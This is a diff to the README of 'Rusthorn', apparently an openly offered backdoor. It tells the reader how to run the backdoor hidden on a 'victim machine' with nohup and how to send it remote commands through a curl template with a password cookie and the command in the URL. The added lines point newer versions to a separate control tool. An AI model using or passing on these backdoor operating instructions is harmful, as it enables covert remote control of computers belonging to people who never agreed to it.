@@ -59,7 +59,7 @@ You may also want to run it via nohup:
 nohup ./rusthorn &> /dev/null &
 ```
 
-## Interaction
+## Interaction at v0.1
 
 By default your backdoor will be running at 0.0.0.0 in the victim machine, meaning it should be reachable from any net its interfaces are connected to.
 You can easily interact with your backdoor via curl, remember to pass your password or your commands will be rejected. You may use this template:
@@ -69,3 +69,9 @@ curl -b "pswd=[PASSWORD]" http://[ip]:[PORT]/[command]
 ```
 
 Rusthorn interprets "+" in the URL as whitespace, so that character may be used if a command requires whitespaces to add flags.
+
+## Interaction at >v0.1
+
+Due to better security you will need to clone and configure the OPC tool to interact with higher versions of Rusthorn:
+
+https://github.com/XoanOuteiro/OPC
